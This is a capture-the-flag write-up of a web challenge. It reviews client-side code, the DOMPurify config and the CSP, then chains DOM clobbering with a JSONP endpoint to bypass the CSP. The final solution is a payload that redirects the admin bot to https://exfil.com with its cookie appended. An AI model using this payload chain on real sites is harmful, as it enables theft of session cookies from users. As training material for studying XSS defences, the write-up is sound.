#### Summary
- The app is super basic and provides some form of searching functionality to it's users.
- Although the challenge application source was not provided, we do have access to the client side code for `challenge.html`, `/js/main.js`, and `/js/components.js`.
#### Review: `challenge.html`
- Nothing crrazy, this is just some html that renders the main app content.
- The part I am concerned most about with right now is what scripts are being sourced.  This is found in the script tags at the bottom of the source code for `xhallenge.html`.
	```html
	<script src="/js/purify.min.js"></script>
	<script src="/js/components.js"></script>
	<script src="/js/main.js"></script>
	```
- This page also contains definitions for what the search for does when submitted(snippet below).  It's a simple `GET` form with action `challenge.html` which means that, when the form is submitted, the page will basically reload with the `q` parameter name and value appended to the url.
	```html
	<form id="searchForm" action="/challenge.html" method="GET">
		<input type="text" name="q" id="q" placeholder="Search operational intelligence..." autocomplete="off">
		<button type="submit">Search</button>
		<input type="hidden" name="domain" value="internal">
	</form>
	```
#### Review: `main.js`
- This script sets up some general app config and behavior.
- One thing to note is that, when this script loads, if there is a q parameter in the url, then its value will be loaded, sanitized with DOMPurify, and includes it inside `resultsContainer.innerHTML`.
```javascript
const q = params.get('q');
const resultsContainer = document.getElementById('resultsContainer');
if (q) {
	const cleanHTML = DOMPurify.sanitize(q, {
		FORBID_ATTR: ['id', 'class', 'style'],
		KEEP_CONTENT: true
	});
	resultsContainer.innerHTML = `<p>Results for: <span class="search-term-highlight">${cleanHTML}</span></p>
								  <p style="margin-top: 10px; color: #64748b;">No matching records found in the current operational datastore.</p>`;
} // ... REDACTED
```
- Another important thing to note is that the DOMPurify config is here as well.  In the example above you can see the value of `q` gets passed to `DOMPurify.sanitize` which has settings to prevent the use of `id`, `class`, and `style` attributes.  It also sets `KEEP_CONTENT: true` which means( that IF DOMPurify finds a tag that it wants to get rid of, then it will not also remove that tags content.
- This script sets up an event handler for the report form as well.

#### Review: `components.js`
- This is where things start to get a little bit interesting.
- There's 2 main chunks of logic in this file: `window.Auth.loginRedirect` and `ComponentManager`.
- What does `window.Auth.loginRedirect` do?
	- Sets the value of `config` to `window.authConfig` or a default value
	- Sets the value of `redirectUrl` to `window.authConfig.dataset.next`
	- if `window.authConfig.dataset.append === "true"`
		- append `document.cookie` to `redirectUrl`
	- Set `window.location.href` to `redirectUrl`
- What does `ComponentManager` do?
	- This is a simple class that defines out 2 methods: `init` and `loadComponent`.
	- The `init` method contains the only reference to `loadComponent`.
	- The `init` method is called from the `js/main.js` file.
	- The basic idea of the `init` method is:
		- Get a reference to all elements with attribute `data-component="true"`
		- Send each element to `loadComponent`.
	- The basic Idea of the `loadComponent` method is:
		- Load the attribute `data-config` from the element. Return if falsey.
		- Parse the data from the `data-config` attribute as JSON.
		- Load the `path` and `type` properties from the JSON object.
		- Use those to craft and render a script tag in the format below
			```html
			<script src="<path><type>.js"></script>
			```
#### A note on potential DOMPurify weaknesses
- Looking at the top of the `js/purify.min.js` file I see `DOMPurify 3.0.6`.
	- I did some quick standard enumeration on this version number.  There are some CVEs available against this version, but I didn't see anything that looked right.
- By default DOMPurify does not filter out `data-` attributes.
	- This means that if the source is trying to reference any of the `data-` attributes then DOMPurify will NOT block this content.  This particular app DOES reference `data-` attributes and uses the syntax below.
		- `config.dataset.append`
		- `element.getAttribute('data-config')`

#### A Note on DOM Clobbering weaknesses
- As I review the client side source code I see some areas that might be vulnerable to DOM Clobbering. In the example below, I'm looking at `window.Auth` and `window.authConfig`.
```javascript
window.Auth.loginRedirect = function (data) {
    console.log("[Auth] Callback received data:", data);
    let config = window.authConfig || {
	// ... REDACTED
```
- This is vulnerable to DOM Clobbering IF I can get specially crafted DOM into the window. For example, the form below can be referenced from js with `window.authConfig`.
```html
<form name="authConfig"></form>
```

#### Playing with the `ComponentManager` gadget
- As a reminder, this section of code takes user input and uses it to craft the `src` attribute in a `script` tags.
- By providing a tag like the `div` below, then we can get the page to try and load any source that we wish.  The example below will cause the page to render a `<script src="somePath/someFile.js"></script>`
	```html
	<div data-config='{"path":"somePath/","type":"someFile"}' data-component="true"></div>
	```
- This is great but the CSP actually prevents us from sourcing javascript cross origin.

#### Review: CSP
```
default-src 'none';
script-src 'self';
connect-src 'self';
img-src 'self' data:;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com;
frame-ancestors 'self';
frame-src 'self';
```
- I cannot use this page in a cross origin iframe
- I cannot use an iframe in the DOM to load a cross origin site
- I cannot use a script tag with `textContent`, it MUST contain a `src` and it must be a same origin source.

#### Reflecting on an attack vector
- At this point I've identified some stuff but I still don't have a clear attack path.
- I'm theorizing that the flag lives in an admin/bot browser cookie.
	- If I can execute JS then I can just exfil `document.cookie`
	- Alternatively, if I can find a way to call the `Auth.loginRedirect` function (with malicious DOM), then I can exfil the flag as well.

#### Missing Piece
- I don't quite have enough to form a complete attack chain.
- Since the CSP prevents me from loading cross origin scripts I still don't have a way to get to XSS.
- I need a gadget.  I need a route on this site that returns valid, attacker-controlled JS.
- I did some digging through the source as well as standard endpoint enumeration and eventually found a new route, `/api/stats`.
- When I send a basic GET request to `/api/stats` I get the response:
	```json
	{ "error": "Invalid callback identifier" }
	```
- I played around with this route some more and came up with `/api/stats?callback=meow` which returns
	```javascript
	meow({
	    "users": 1337,
	    "active": 42,
	    "status": "Operational"
	});
	```
	- This looks like a standard JSONP response.
	- This is probably enough to get the `Auth.loginRedirect` function called.


#### Solution
- I was able to solve this challenge by providing the HTML below as input to the search form.
```html
<div data-config='{"path":"api/","type":"stats?callback=Auth.loginRedirect#"}' data-component="true"></div>
<form name="authConfig" data-next="https://exfil.com/meow.html" data-append="true"></form>
```
- The 1st tag gets processed by the `ComponentManager` class to create and embed the tag `<script src="api/stats?callback=Auth.loginRedirect#"></script>`
	- Note: a `#` character is needed at the end because the application logic appends a `.js` and we need to make sure that it does not get processed.
- The 2nd tag gets processed by the `Auth.loginRedirect`
	```javascript
	let config = window.authConfig || {
        dataset: {
            next: '/',
            append: 'false'
        }
    };
	let redirectUrl = config.dataset.next || '/';
	if (config.dataset.append === 'true') {
		let delimiter = redirectUrl.includes('?') ? '&' : '?';
		redirectUrl += delimiter + "token=" + encodeURIComponent(document.cookie);
	}
	// ... REDACTED
	```
	- `config` becomes a reference to the `form` element
	- `redirectUrl` becomes the value of the forms `data-next` attribute
	- the form's `data-append` must also be set to `true` so the block that appends the cookie gets executed